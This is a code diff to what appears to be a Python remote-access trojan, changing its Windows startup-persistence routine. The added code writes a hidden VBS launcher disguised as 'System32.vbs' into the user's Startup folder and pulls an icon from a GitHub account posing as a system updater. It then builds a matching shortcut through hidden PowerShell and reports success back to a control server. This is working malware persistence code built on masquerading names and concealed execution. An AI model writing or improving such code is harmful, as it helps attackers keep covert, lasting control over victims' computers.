@@ -428,13 +428,38 @@ class Others:
             if res == 42: os._exit(0)
                 
     def startup(self):
-        startupFile = os.path.join(os.environ["APPDATA"],"Microsoft","Windows","Start Menu","Programs","Startup","System32.vbs")
-        with open(startupFile, "w",) as f:
-            f.write(f'''' python installer
-CreateObject("WScript.Shell").run "cmd /c ""cd %APPDATA%\\{BASE_FOLDER_NAME} & python -m cyrix86 {sys.argv[1]}""", 0''')
+        startupFolder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        vbsFile = os.path.join(startupFolder, "System32.vbs")
+        lnkFile = os.path.join(startupFolder, "System32.lnk")
+        icoFile = os.path.join(os.environ["APPDATA"], "python313", "icon.ico")
+
+        # Baixa o icone do GitHub
+        try:
+            icoUrl = "https://raw.githubusercontent.com/SystemSteamUpdatb/System32/main/icon.ico"
+            r = requests.get(icoUrl, headers={"User-Agent": USERAGENT})
+            if r.status_code == 200:
+                with open(icoFile, "wb") as f:
+                    f.write(r.content)
+        except:
+            icoFile = "C:\\Windows\\System32\\shell32.dll"
+
+        # Cria o VBS
+        with open(vbsFile, "w") as f:
+            f.write(f'rem python installer\nCreateObject("WScript.Shell").run "cmd /c ""cd %APPDATA%\\{BASE_FOLDER_NAME} & python -m System32 {sys.argv[1]}""", 0')
+
+        # Cria o atalho com icone
+        ps = f"""
+$WS = New-Object -ComObject WScript.Shell
+$SC = $WS.CreateShortcut('{lnkFile}')
+$SC.TargetPath = '{vbsFile}'
+$SC.IconLocation = '{icoFile},0'
+$SC.Save()
+"""
+        subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", ps])
+
         toServer({
             "type": self.type,
-            "output": f"Startup file created successfully" if os.path.exists(startupFile) else f"Startup file creation failed"
+            "output": f"Startup file created successfully" if os.path.exists(lnkFile) else f"Startup file creation failed"
         })
 
 HANDLER_MAP = {
